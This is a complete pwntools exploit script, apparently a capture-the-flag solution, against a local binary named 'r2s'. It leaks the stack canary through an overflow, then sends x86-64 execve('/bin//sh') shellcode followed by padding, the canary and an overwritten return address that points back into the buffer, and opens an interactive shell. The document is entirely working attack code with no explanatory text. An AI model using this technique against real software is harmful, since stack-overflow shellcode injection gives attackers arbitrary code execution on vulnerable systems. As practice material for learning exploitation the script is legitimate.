from pwn import *

p = process('./r2s')
#gdb.attach(p, api=True)

shellcode = b"\x48\x31\xFF\x57\x48\xBF\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x57\x48\x31\xF6\x48\x31\xD2\x48\x89\xE7\x48\x31\xC0\x48\x83\xC0\x3B\x0F\x05"

p.recvuntil(b'buf: ')
buf = int(p.recvline()[:-1], 16)
p.recvuntil(b'$rbp: ')
offset = int(p.recvline()[:-1])
leak = b'a'*(offset - 8)
p.recvuntil(b'Input: ')
p.sendline(leak)
p.recvuntil(b'\n')
canary = u64(b'\x00'+p.recvn(7))

log.info('buf ' + hex(buf))
log.info('offset ' + str(offset))
log.info('Canary ' + hex(canary))

payload = shellcode + (offset - 8 - len(shellcode)) * b"\x00" + p64(canary) + b"A"*8 + p64(buf)
p.recvuntil(b'Input: ')
p.sendline(payload)


p.interactive()